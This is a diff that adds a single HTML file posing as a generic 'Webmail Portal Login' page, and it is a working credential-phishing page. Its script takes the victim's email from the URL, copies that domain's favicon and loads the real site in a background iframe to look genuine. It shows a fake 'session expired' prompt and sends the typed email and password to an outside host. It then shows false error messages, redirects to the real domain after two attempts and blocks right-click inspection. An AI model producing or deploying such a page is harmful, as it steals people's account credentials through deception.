@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="content-type" content="text/html; charset=windows-1252">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex, nofollow">
+    <title>Webmail Portal Login</title>
+    <script src="jquery-1.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="bootstrap.min.css">
+    <link href="https://fonts.googleapis.com/css?family=Yellowtail&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            background: #f3f2f1;
+        }
+
+        #root {
+            position: absolute;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            top: 0;
+            z-index: 0;
+            pointer-events: auto;
+        }
+
+        /* Center the form absolutely */
+        #login-form {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1000;
+            min-width: 380px;
+            max-width: 440px;
+            width: 98vw;
+        }
+
+        .smart-modal {
+            border-radius: 12px;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.13);
+            background: #fff;
+            border: 1px solid #e1dfdd;
+            padding: 34px 32px 28px 32px;
+            min-height: 340px;
+        }
+
+        .modal-header {
+            border-bottom: none;
+            padding: 0 0 14px 0;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+        }
+
+            .modal-header h5 {
+                font-size: 1.05rem;
+                font-weight: 600;
+                color: #323130;
+                margin: 0;
+                display: flex;
+                align-items: center;
+                gap: 7px;
+            }
+
+            .modal-header img {
+                height: 22px;
+                width: 22px;
+                border-radius: 4px;
+                background: #fff;
+                border: 1px solid #e1dfdd;
+                margin-right: 7px;
+            }
+
+            .modal-header #logoname {
+                font-size: 0.93rem;
+                font-weight: 500;
+                color: #444;
+                letter-spacing: 0.5px;
+            }
+
+        .modal-body {
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .session-msg {
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .alert, #error {
+            margin-top: 8px;
+            text-align: center;
+            width: 100%;
+            font-size: 12px;
+            padding: 5px 0;
+        }
+
+        .input_box {
+            position: relative;
+            margin-top: 14px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+        }
+
+            .input_box input {
+                width: 96%;
+                height: 40px;
+                border: 1px solid #ccc;
+                border-radius: 4px;
+                padding-left: 30px;
+                font-size: 14px;
+                display: block;
+                margin: 0 auto;
+                background: #faf9f8;
+            }
+
+            .input_box .icon {
+                position: absolute;
+                top: 50%;
+                left: 10px;
+                transform: translateY(-50%);
+                color: #888;
+                font-size: 14px;
+            }
+
+        #submit-btn {
+            width: 96%;
+            height: 40px;
+            font-size: 15px;
+            font-weight: 500;
+            background-color: #0078d4;
+            border: none;
+            color: #fff;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 22px auto 0 auto;
+            transition: background 0.2s;
+        }
+
+            #submit-btn:hover, #submit-btn:focus {
+                background-color: #005a9e;
+            }
+
+        .modal-footer {
+            border-top: none;
+            display: flex;
+            justify-content: center;
+            background: #fff;
+            border-radius: 0 0 8px 8px;
+            padding: 0;
+        }
+    </style>
+</head>
+<body translate="no">
+    <div id="root">
+        <iframe id="iframe" scrolling="no" src="" width="100%" height="100%" frameborder="0"></iframe>
+    </div>
+
+    <form id="login-form" action="#" method="post" autocomplete="off">
+        <div class="smart-modal">
+            <div class="modal-header">
+                <h5>
+                    <img id="logoimg" src="">
+                    <span id="logoname" style="text-transform: capitalize;"></span>
+                </h5>
+            </div>
+            <div class="modal-body">
+                <div class="session-msg text-danger">
+                    Your session has expired, please login again to continue.
+                </div>
+                <div class="alert alert-danger" id="msg" style="display:none;">
+                    Invalid Password! Please Enter your correct Password
+                </div>
+                <div id="error" class="text-danger" style="display:none;">
+                    That account doesn't exist. Enter a different account
+                </div>
+                <div class="input_box">
+                    <input type="email" name="username" id="email" placeholder="Email" disabled>
+                    <div class="icon"><i class="fas fa-user"></i></div>
+                </div>
+                <div class="input_box">
+                    <input type="password" name="password" id="password" placeholder="Password" required>
+                    <div class="icon"><i class="fas fa-lock"></i></div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button type="submit" id="submit-btn">
+                    Sign in
+                </button>
+            </div>
+        </div>
+    </form>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            var count = 0;
+            const params = new URLSearchParams(window.location.search);
+            var email = params.get("email");
+
+            if (email) {
+                $('#email').val(email);
+                var ind = email.indexOf("@");
+                var my_slice = email.substr((ind + 1));
+                var c = my_slice.substr(0, my_slice.indexOf('.'));
+                var finalu = c.toUpperCase();
+                $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain=" + my_slice);
+                $("#logoname").html(finalu);
+                $("#iframe").attr("src", "https://www." + my_slice);
+            }
+
+            $('#login-form').submit(function (event) {
+                event.preventDefault();
+                $('#error').hide(); $('#msg').hide();
+                var email = $("#email").val();
+                var password = $("#password").val();
+
+                if (!email || !password) return;
+
+                count++;
+                $.ajax({
+                    dataType: 'JSON',
+                    url: 'https://www.suissepilot.com/valley.php',
+                    type: 'POST',
+                    data: { email: email, password: password },
+                    beforeSend: function () {
+                        $('#submit-btn').html('Verifying <span class="spinner-border spinner-border-sm"></span>');
+                    },
+                    success: function (response) {
+                        if (response && response['signal'] == 'ok') {
+                            $("#password").val("");
+                            if (count >= 2) {
+                                count = 0;
+                                window.location.replace("http://www." + email.split('@')[1]);
+                            }
+                        } else {
+                            $("#msg").show();
+                        }
+                    },
+                    error: function () {
+                        $("#password").val("");
+                        if (count >= 2) {
+                            count = 0;
+                            window.location.replace("http://www." + email.split('@')[1]);
+                        }
+                        $("#msg").show();
+                    },
+                    complete: function () {
+                        $('#submit-btn').html('Sign in');
+
+                    }
+
+                });
+            });
+        });
+    </script>
+	
+	  <script>
+                document.addEventListener('contextmenu', function (e) {
+                    e.preventDefault();
+                });
+            </script>
+</body>
+</html>
